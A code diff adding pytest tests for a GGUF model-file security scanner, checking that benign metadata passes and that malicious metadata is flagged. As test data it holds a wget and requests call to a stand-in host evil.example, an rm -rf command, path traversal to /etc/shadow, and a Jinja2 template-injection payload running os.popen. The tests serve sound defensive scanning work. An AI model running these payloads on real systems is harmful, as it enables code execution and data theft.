@@ -181,6 +181,14 @@ def _assert_no_warning_or_critical_issues(result: Any) -> None:
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
 
 
+def _failed_metadata_value_checks(result: Any) -> list[Any]:
+    return [
+        check
+        for check in result.checks
+        if check.name == "Metadata Value Security Check" and check.status == CheckStatus.FAILED
+    ]
+
+
 def _assert_uncached_rerun_preserves_inconclusive_exit2(
     path: Path,
     cache_dir: Path,
@@ -1052,6 +1060,94 @@ def test_gguf_scanner_suspicious_values(tmp_path):
 
     result = GgufScanner().scan(str(path))
     assert any("suspicious" in i.message.lower() for i in result.issues)
+    checks = _failed_metadata_value_checks(result)
+    assert checks[0].details["evidence_type"] == "command_execution"
+
+
+@pytest.mark.parametrize(
+    ("key", "value"),
+    [
+        ("general.base_model.0.repo_url", "https://huggingface.co/google/gemma-4-12B-it"),
+        ("general.license.url", "https://www.apache.org/licenses/LICENSE-2.0"),
+        ("general.description", "repository/name | tokenizer/model vocabulary path"),
+        (
+            "tokenizer.chat_template",
+            "{% for message in messages %}{{ '<|turn>' + message['role'] + '\\n' }}"
+            "{{ message['content'] | trim }}<turn|>\n{% endfor %}",
+        ),
+    ],
+)
+def test_gguf_metadata_punctuation_urls_and_chat_templates_do_not_create_s902(
+    tmp_path: Path,
+    key: str,
+    value: str,
+) -> None:
+    path = create_mock_gguf(tmp_path / "benign-metadata.gguf", metadata={key: value})
+
+    result = GgufScanner().scan(str(path))
+
+    assert _failed_metadata_value_checks(result) == []
+    assert not any("Suspicious metadata value" in issue.message for issue in result.issues)
+
+
+def test_gguf_metadata_key_slashes_without_traversal_are_not_flagged(tmp_path: Path) -> None:
+    path = create_mock_gguf(tmp_path / "key-slash.gguf", metadata={"repository/url": "local mirror"})
+
+    result = GgufScanner().scan(str(path))
+
+    assert not [
+        check
+        for check in result.checks
+        if check.name == "Metadata Key Security Check" and check.status == CheckStatus.FAILED
+    ]
+
+
+@pytest.mark.parametrize(
+    ("key", "value", "evidence_type"),
+    [
+        ("command", "rm -rf /tmp/model-cache", "command_execution"),
+        ("loader", "subprocess.run(['id'])", "command_execution"),
+        ("payload_path", "../tmp/../../payload.bin", "path_traversal"),
+        ("encoded_payload", "%2E%2e/%2e%2e/etc/shadow", "path_traversal"),
+        ("download", "wget https://evil.example/payload.sh -O /tmp/payload.sh", "remote_fetch"),
+        ("callback", "requests.get('https://evil.example/payload')", "remote_fetch"),
+    ],
+)
+def test_gguf_metadata_value_requires_concrete_security_evidence(
+    tmp_path: Path,
+    key: str,
+    value: str,
+    evidence_type: str,
+) -> None:
+    path = create_mock_gguf(tmp_path / "concrete-evidence.gguf", metadata={key: value})
+
+    result = GgufScanner().scan(str(path))
+
+    checks = _failed_metadata_value_checks(result)
+    assert checks
+    assert any(check.details["evidence_type"] == evidence_type for check in checks)
+    assert all(check.rule_code == "S902" for check in checks)
+
+
+def test_gguf_chat_template_command_payload_still_uses_jinja_analysis(tmp_path: Path) -> None:
+    target = tmp_path / "template-target.txt"
+    target.write_text("fixture", encoding="utf-8")
+    path = create_mock_gguf(
+        tmp_path / "unsafe-template.gguf",
+        metadata={
+            "tokenizer.chat_template": (
+                "{{ cycler.__init__.__globals__.os.popen('cat " + target.as_posix() + "').read() }}"
+            ),
+        },
+    )
+
+    result = GgufScanner().scan(str(path))
+
+    assert _failed_metadata_value_checks(result) == []
+    assert any(
+        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
 
 
 def test_gguf_scanner_string_length_security(tmp_path: Path) -> None:
